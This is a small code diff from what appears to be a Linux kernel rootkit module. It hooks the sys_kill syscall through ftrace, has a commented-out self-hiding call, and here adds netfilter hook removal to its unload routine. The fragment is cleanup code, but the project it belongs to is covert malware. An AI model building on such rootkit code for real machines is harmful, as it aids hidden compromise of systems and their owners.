@@ -4,7 +4,6 @@ static struct ftrace_hook hooks[] = {
         HOOK("sys_kill", hook_kill, &orig_kill),
 };
 
-
 static int __init rk_init(void){
     // hideme();
     int err;
@@ -22,6 +21,8 @@ static int __init rk_init(void){
 static void __exit rk_cleanup(void){
     /* Unhook and restore the syscall and print to the kernel buffer */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    nf_unregister_net_hook(&init_net, &my_nfho);
+
     printk(KERN_INFO "poetry: unloaded\n");
 }
 
